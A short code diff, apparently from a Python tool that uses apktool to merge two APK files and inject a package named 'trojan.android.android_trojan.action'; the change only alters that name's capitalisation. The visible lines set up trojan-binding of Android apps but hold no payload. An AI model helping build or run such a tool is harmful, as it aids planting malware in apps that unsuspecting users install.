@@ -12,7 +12,7 @@ import glob
 apktool = "/home/hoodlums/apktool/apktool"
 TempDirectory = '/tmp/MixApk/'
 
-packageToInject = 'trojan.android.android_trojan.Action'
+packageToInject = 'trojan.android.android_trojan.action'
 
 apk1 = TempDirectory + 'apk1.apk'
 apk2 = TempDirectory + 'apk2.apk'
